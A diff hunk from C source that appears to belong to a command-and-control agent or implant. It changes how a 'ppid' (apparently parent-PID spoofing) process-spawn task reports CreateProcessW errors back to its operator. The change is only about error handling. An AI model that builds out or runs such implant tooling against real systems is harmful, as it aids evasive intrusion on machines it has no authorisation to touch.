@@ -943,11 +943,11 @@ void dispatch_task(AgentTask *task) {
                     /* Thread leaked intentionally — may still be in CreateProcessW */
                     agent_send_result(task->id, "", "ppid: timed out");
                 } else {
-                    int ok = work->ok;
+                    int ok = work->ok; DWORD werr = work->err;
                     free(work);
                     if      (ok ==  1) agent_send_result(task->id, "[+] spawned", "");
-                    else if (ok == -2) agent_send_result(task->id, "", "ppid: exception in spawn");
-                    else { char err[64]; snprintf(err,sizeof(err),"ppid: failed (err %lu)",GetLastError()); agent_send_result(task->id,"",err); }
+                    else if (ok == -2) { char err[64]; snprintf(err,sizeof(err),"ppid: exception (code 0x%lx)",werr); agent_send_result(task->id,"",err); }
+                    else { char err[64]; snprintf(err,sizeof(err),"ppid: CreateProcessW failed (err %lu)",werr); agent_send_result(task->id,"",err); }
                 }
             }
         }
